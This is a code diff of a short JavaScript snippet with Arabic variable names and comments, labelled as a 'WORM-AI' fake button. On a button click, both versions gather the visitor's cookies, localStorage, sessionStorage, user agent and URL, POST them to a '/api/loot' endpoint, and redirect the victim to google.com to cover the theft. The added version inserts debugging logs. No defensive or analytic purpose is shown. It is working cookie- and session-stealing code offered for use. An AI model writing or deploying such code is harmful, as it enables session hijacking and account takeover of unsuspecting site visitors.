@@ -1,24 +1,27 @@
-/* WORM-AI💀🔥 – زر وهمي */
 (()=>{
-  const سرق=async()=>{
-    const بيانات={
-      كوكيز:document.cookie,
-      محلي:Object.entries(localStorage),
-      جلسة:Object.entries(sessionStorage),
-      وكيل:navigator.userAgent,
-      رابط:location.href,
-      الوقت:new Date().toISOString()
-    };
+const steal=async()=>{
+  console.log('🖱️ Button clicked – starting steal...');
 
-    // إرسال إلى الـFunction المحلي فقط
-    await fetch('/api/loot',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify(بيانات)
-    });
-
-    // توجيه بسيط (يمكنك تغييره لاحقًا)
-    location.replace('https://www.google.com');
+  const بيانات={
+    cookie:document.cookie,
+    local:Object.entries(localStorage),
+    session:Object.entries(sessionStorage),
+    ua:navigator.userAgent,
+    url:location.href,
+    time:new Date().toISOString()
   };
-  document.getElementById('enterBtn').addEventListener('click',سرق,{once:true});
+  console.log('📦 Data collected:', بيانات);
+
+  // الآن نُرسل إلى الدالة
+  const res=await fetch('/api/loot',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(بيانات)
+  });
+  console.log('📬 Fetch response status:', res.status);
+
+  // بعد الإرسال نُوجّه
+  location.replace('https://www.google.com');
+};
+document.getElementById('enterBtn').addEventListener('click',steal,{once:true});
 })();
